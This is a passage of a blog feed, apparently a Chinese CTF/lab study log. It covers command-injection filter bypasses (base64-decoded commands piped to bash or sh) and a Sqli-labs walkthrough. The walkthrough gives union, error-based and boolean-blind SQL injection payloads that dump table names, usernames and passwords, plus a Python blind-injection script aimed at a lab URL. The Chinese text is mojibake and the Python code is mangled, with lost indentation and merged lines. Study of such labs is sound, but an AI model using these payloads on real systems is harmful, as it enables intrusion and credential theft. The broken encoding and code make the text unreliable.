class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?ip=127.0.0.1;echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bashæ— æ³•ä½¿ç”¨</span><br><span class=\"line\">å¯ä»¥ç”¨?ip=127.0.0.1;echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|sh</span><br></pre></td></tr></table></figure>\n<p>ZmxhZw==|base64 -d</p>\n<h2 id=\"10ç»•è¿‡é•¿åº¦é™åˆ¶å’Œçš„ä½¿ç”¨\"><a class=\"markdownIt-Anchor\" href=\"#10ç»•è¿‡é•¿åº¦é™åˆ¶å’Œçš„ä½¿ç”¨\">#</a> 10. ç»•è¿‡é•¿åº¦é™åˆ¶ &gt; å’Œ &gt;&gt; çš„ä½¿ç”¨</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ä½¿ç”¨`&gt;`å‘½ä»¤ä¼šå°†åŸæœ‰æ–‡ä»¶å†…å®¹è¦†ç›–ï¼Œå¦‚æœæ˜¯å­˜å…¥ä¸å­˜åœ¨çš„æ–‡ä»¶åï¼Œé‚£ä¹ˆå°±ä¼šæ–°å»ºæ–‡ä»¶å†å­˜å…¥</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&gt;&gt;`ç¬¦å·çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²æ·»åŠ åˆ°æ–‡ä»¶å†…å®¹æœ«å°¾ï¼Œä¸ä¼šè¦†ç›–åŸå†…å®¹</span><br></pre></td></tr></table></figure>\n<h2 id=\"11å‘½ä»¤æ¢è¡Œ\"><a class=\"markdownIt-Anchor\" href=\"#11å‘½ä»¤æ¢è¡Œ\">#</a> 11. å‘½ä»¤æ¢è¡Œ</h2>\n<p>ca<br>\nt<br>\nfl<br>\nag</p>\n<h2 id=\"12å€Ÿç”¨å·²æœ‰å­—ç¬¦ä¸²\"><a class=\"markdownIt-Anchor\" href=\"#12å€Ÿç”¨å·²æœ‰å­—ç¬¦ä¸²\">#</a> 12. å€Ÿç”¨å·²æœ‰å­—ç¬¦ä¸²</h2>\n<p>substr æˆªå–</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">expr substr ceshi01.php 3 5</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo `expr substr $(awk NR==1 ceshi01.php) 1 1`</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/28/sqli-labs/",
            "url": "https://hq185187.github.io/2023/04/28/sqli-labs/",
            "title": "Sqli-labsé¶åœºé€šå…³",
            "date_published": "2023-04-28T07:34:52.582Z",
            "content_html": "<h3 id=\"æ€ä¹ˆåˆ¤æ–­å­—ç¬¦å‹æˆ–è€…æ•°å­—å‹\"><a class=\"markdownIt-Anchor\" href=\"#æ€ä¹ˆåˆ¤æ–­å­—ç¬¦å‹æˆ–è€…æ•°å­—å‹\">#</a> æ€ä¹ˆåˆ¤æ–­å­—ç¬¦å‹æˆ–è€…æ•°å­—å‹ï¼Ÿ</h3>\n<p>æ•°å­—å‹:id=2 å’Œ id=3-1 è¿”å›ç•Œé¢ç›¸åŒ<br>\nåŸç†ï¼šè¯´æ˜ 3-1 è¢«è§£æäº†ï¼Œæ—è¾¹æ²¡æœ‰å¼•å·<br>\nå­—ç¬¦å‹:id=2 å’Œ id=2a é¡µé¢ä¸€æ ·å°±è¡Œ<br>\nåŸç†ï¼šMySQL ç­‰å·ä¸¤è¾¹ç±»å‹ä¸ä¸€è‡´ä¼šå‘ç”Ÿå¼ºåˆ¶è½¬æ¢ï¼Œå­—ç¬¦ä¸² -&gt; æ•°å­—</p>\n<p>group_concat æ˜¯ç”¨ï¼Œè¿æ¥å¤šè¡Œè®°å½•çš„å‡½æ•°</p>\n<h2 id=\"less1\"><a class=\"markdownIt-Anchor\" href=\"#less1\">#</a> less1</h2>\n<p>å­—ç¬¦å‹æ³¨å…¥<br>\nçœ‹æºç :sql=â€œSELECT * FROM users WHERE id=â€™$idâ€™ LIMIT 0,1â€;</p>\n<p>å› æ­¤:<mark>payload:1â€™   æ“ä½œ   --+</mark></p>\n<p>?id=1â€™ order by 3â€“+<br>\n?id=1â€™ order by 4â€“+<br>\n?id=-1â€™ union select 1,2,3â€“+// åˆ¤æ–­å›æ˜¾ä½<br>\nï¼Ÿid=-1â€™ union select 1,2,database ()â€“+<br>\n?id=-1â€™ union select1,2,group_concat(table_name) from information_schema.tables where table_schema=database()â€“+</p>\n<p>?id=-1â€™ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=â€˜usersâ€™ and table_schema=database()â€“+</p>\n<p>?id=-1â€™ union select 1,group_concat(username),group_concat(password) from usersâ€“+</p>\n<h2 id=\"less2\"><a class=\"markdownIt-Anchor\" href=\"#less2\">#</a> less2</h2>\n<p>æ•°å­—å‹<br>\nçœ‹æºç :sql=â€œSELECT * FROM users WHERE id=$id LIMIT 0,1â€;<br>\n ç›´æ¥è¾“å…¥æ•°å­—å°±å¥½ï¼Œè§£æ³•ä¸ less1 ç›¸åŒï¼Œå»æ‰ less1 çš„â€™å’Œâ€“+ å³å¯</p>\n<h2 id=\"less3\"><a class=\"markdownIt-Anchor\" href=\"#less3\">#</a> less3</h2>\n<p>id=1â€™)â€“+</p>\n<h2 id=\"less4\"><a class=\"markdownIt-Anchor\" href=\"#less4\">#</a> less4</h2>\n<p>id=1&quot;)â€“+</p>\n<h2 id=\"less5-æŠ¥é”™æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#less5-æŠ¥é”™æ³¨å…¥\">#</a> less5 æŠ¥é”™æ³¨å…¥</h2>\n<h3 id=\"1updatexmlå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#1updatexmlå‡½æ•°\">#</a> 1.updatexml å‡½æ•°</h3>\n<p>updatexml(xml_doument,XPath_string,new_value)<br>\n ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML çš„å†…å®¹<br>\nç¬¬äºŒä¸ªå‚æ•°ï¼šæ˜¯éœ€è¦ update çš„ä½ç½® XPATH è·¯å¾„<br>\nç¬¬ä¸‰ä¸ªå‚æ•°ï¼šæ˜¯æ›´æ–°åçš„å†…å®¹<br>\næ‰€ä»¥ç¬¬ä¸€å’Œç¬¬ä¸‰ä¸ªå‚æ•°å¯ä»¥éšä¾¿å†™ï¼Œåªéœ€è¦åˆ©ç”¨ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»–ä¼šæ ¡éªŒä½ è¾“å…¥çš„å†…å®¹æ˜¯å¦ç¬¦åˆ XPATH æ ¼å¼ï¼Œä¸å¯¹å°±çˆ†å‡ºæ­£ç¡®å†…å®¹<br>\nå¯ä»¥æ ¡éªŒçš„ï¼š0x7e (~),0x5e24 (^$),â€™#â€™(#)<br>\npayload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,database()),1)--+æš´å½“å‰æ•°æ®åº“</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database())),1)--+</span><br><span class=\"line\">æ­¤æ—¶ä¼šå‡ºç°Subquery returns more than 1 row</span><br></pre></td></tr></table></figure>\n<h4 id=\"1å¯ä»¥ç”¨limitè§£å†³limit-01-11-21-31\"><a class=\"markdownIt-Anchor\" href=\"#1å¯ä»¥ç”¨limitè§£å†³limit-01-11-21-31\">#</a> 1. å¯ä»¥ç”¨ limit è§£å†³ï¼Œlimit 0,1 1,1 2,1 3,1</h4>\n<p>limit (a,b): ä» a å¼€å§‹å¾€åçœ‹ b ä¸ªå†…å®¹</p>\n<p>åœ¨ limit 3,1 æ‰¾åˆ° users è¡¨</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database()limit 3,1)),1)--+</span><br></pre></td></tr></table></figure>\n<p>åé¢åŒç†çˆ†å­—æ®µ</p>\n<h4 id=\"2åŠ ä¸ªgroup_concatè§£å†³\"><a class=\"markdownIt-Anchor\" href=\"#2åŠ ä¸ªgroup_concatè§£å†³\">#</a> 2. åŠ ä¸ª group_concat è§£å†³</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)--+</span><br><span class=\"line\">è¿‡ç¨‹åŒä¸Š</span><br><span class=\"line\"></span><br><span class=\"line\">æœ€å</span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)--+</span><br></pre></td></tr></table></figure>\n<h4 id=\"3substræ–¹æ³•\"><a class=\"markdownIt-Anchor\" href=\"#3substræ–¹æ³•\">#</a> 3.substr æ–¹æ³•</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)--+</span><br><span class=\"line\">æœ€å:</span><br><span class=\"line\">?id=1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(id,username,password) from users),1,31),0x7e),1)--+</span><br></pre></td></tr></table></figure>\n<p>åé¢æŠŠ 1,31 æ¢æˆ 32,31  å’Œ 63,31 å’Œ 94,31<br>\n<mark> å› ä¸º substr ä¸€æ¬¡åªèƒ½æˆªå– 32 ä¸ª</mark></p>\n<h3 id=\"2extractvalueå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#2extractvalueå‡½æ•°\">#</a> 2.extractvalue å‡½æ•°</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">å‡½æ•°åŸå‹ï¼šextractvalue(xml_document,Xpath_string)</span><br><span class=\"line\">ç¬¬ä¸€ä¸ªå‚æ•°ï¼šxml_documentæ˜¯stringæ ¼å¼ï¼Œä¸ºxmlæ–‡æ¡£å¯¹è±¡çš„åç§°</span><br><span class=\"line\">ç¬¬äºŒä¸ªå‚æ•°ï¼šXpath_stringæ˜¯xpathæ ¼å¼çš„å­—ç¬¦ä¸²</span><br><span class=\"line\">ä½œç”¨ï¼šä»ç›®æ ‡xmlä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure>\n<p>ç¬¬äºŒä¸ªå‚æ•°è‹¥ä¸ç¬¦åˆ xpath è¯­æ³•å°±ä¼šæŠ¥é”™å‡ºä¿¡æ¯ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())))--+</span><br><span class=\"line\"></span><br><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))--+</span><br></pre></td></tr></table></figure>\n<p><mark>ä½†æ˜¯è¿™ä¸ªå‡½æ•°ä¹Ÿæ˜¯æœ€å¤§åªèƒ½æˆªå– 32 ä¸ªï¼Œå› æ­¤æƒ³çœ‹åé¢çš„è¿˜å¾—è¦ substr å‡½æ•°</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1&#x27; and extractvalue(1,concat(0x7e,substr((select group_concat(id,username,password)from users),31,31)))--+</span><br></pre></td></tr></table></figure>\n<h3 id=\"less6\"><a class=\"markdownIt-Anchor\" href=\"#less6\">#</a> less6</h3>\n<p>id=1&quot; ä¸ less5 ä¸€æ ·</p>\n<h3 id=\"less7\"><a class=\"markdownIt-Anchor\" href=\"#less7\">#</a> less7</h3>\n<p>å¸ƒå°”ç›²æ³¨:<br>\n é¦–å…ˆè¯•æ¢é—­åˆæƒ…å†µ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;--+</span><br><span class=\"line\">1&quot;--+</span><br><span class=\"line\">1&#x27;)--+</span><br><span class=\"line\">1&#x27;))--+  è¿™ä¸ªæ˜¯</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select mid((group_concat(username,0x7e,password) from users),1,1))=&#x27;D&#x27;</span><br></pre></td></tr></table></figure>\n<p>æ ¹æ®é¡µé¢å›æ˜¾è¯•æ¢æ•°æ®ï¼Œå¯ä»¥äºŒåˆ†æ³•ï¼Œå‡½æ•°:substring (),mid (),substr ()</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://sqli-labs:100/Less-7/&quot;</span> <span class=\"comment\"># æœ‰å¯åˆ©ç”¨æ¼æ´çš„urlï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;User-Agent&quot;</span>: <span class=\"string\">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Safari/537.36&quot;</span>, &#125; <span class=\"comment\"># http requestæŠ¥æ–‡å¤´éƒ¨ï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">keylist = [<span class=\"built_in\">chr</span>(i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">33</span>, <span class=\"number\">127</span>)] <span class=\"comment\"># åŒ…æ‹¬æ•°å­—ã€å¤§å°å†™å­—æ¯ã€å¯è§ç‰¹æ®Šå­—ç¬¦</span></span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">&#x27;You are in&#x27;</span> <span class=\"comment\"># ç”¨äºåˆ¤æ–­é™„åŠ sqlè¯­å¥ä¸ºçœŸçš„å­—ç¬¦ï¼Œæ ¹æ®ç½‘é¡µå›æ˜¾å¡«å†™</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">CurrentDatabase7</span>():</span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">10</span> <span class=\"comment\"># é¢„æµ‹å½“å‰æ•°æ®åº“åç§°æœ€å¤§å¯èƒ½çš„é•¿åº¦ï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™</span></span><br><span class=\"line\"></span><br><span class=\"line\">k = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">j = n // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">length = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">db = <span class=\"built_in\">str</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k&gt; <span class=\"number\">3</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  payload1 = <span class=\"string\">&quot;1&#x27;)) and length(database())&gt;&quot;</span> + <span class=\"built_in\">str</span>(j) + <span class=\"string\">&quot;-- ss&quot;</span> <span class=\"comment\"># æ‰€æœ‰payloadæ ¹æ®å®é™…æƒ…å†µå¡«å†™</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  param = &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"string\">&quot;id&quot;</span>: payload1,</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  response = requests.get(url, params=param, headers=headers) <span class=\"comment\"># GETæ–¹æ³•å‘é€å«payloadçš„request</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"comment\"># print(response.request.headers)</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"comment\"># print(response.text)</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">if</span> response.text.find(flag) != -<span class=\"number\">1</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  n = n</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  k = j</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">else</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  k = k</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  n = j</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  j = (n - k) // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">elif</span> j - k == <span class=\"number\">3</span> <span class=\"keyword\">or</span> j - k &lt; <span class=\"number\">3</span>: <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(k - <span class=\"number\">1</span>, n + <span class=\"number\">2</span>): payload2=<span class=\"string\">&quot;1&#x27;)) and length(database())=&quot;</span> + <span class=\"built_in\">str</span>(i)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  + <span class=\"string\">&quot;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload2, &#125; response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  response.text.find(flag) !=-<span class=\"number\">1</span>: length=i <span class=\"keyword\">break</span> <span class=\"keyword\">break</span> <span class=\"keyword\">else</span>: <span class=\"keyword\">break</span> <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of current database</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Â  Â  Â  Â  contains &quot;</span> + <span class=\"built_in\">str</span>(length) + <span class=\"string\">&quot; characters&quot;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, length + <span class=\"number\">1</span>): <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> keylist:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  payload3=<span class=\"string\">&quot;1&#x27;)) and substring(database(),&quot;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&quot;,1)=&#x27;&quot;</span> + c + <span class=\"string\">&quot;&#x27;-- ss&quot;</span> param=&#123; <span class=\"string\">&quot;id&quot;</span> : payload3, &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  response=requests.get(url, params=param, headers=headers) <span class=\"keyword\">if</span> response.text.find(flag) !=-<span class=\"number\">1</span>: db=db + c <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the name of current database is &quot;</span> + <span class=\"built_in\">str</span>(db))</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Tables7</span>():</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  n = <span class=\"number\">100</span> Â <span class=\"comment\"># é¢„æµ‹å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨åç§°æœ€å¤§å¯èƒ½çš„é•¿åº¦ï¼Œæ ¹æ®å®é™…æƒ…å†µå¡«å†™</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  k = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  j = n // <span class=\"number\">2</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  length = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  tname = <span class=\"built_in\">str</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">if</span> j &gt; k <span class=\"keyword\">and</span> j &lt; n <span class=\"keyword\">and</span> j - k &gt; <span class=\"number\">3</span>:</span><br><span 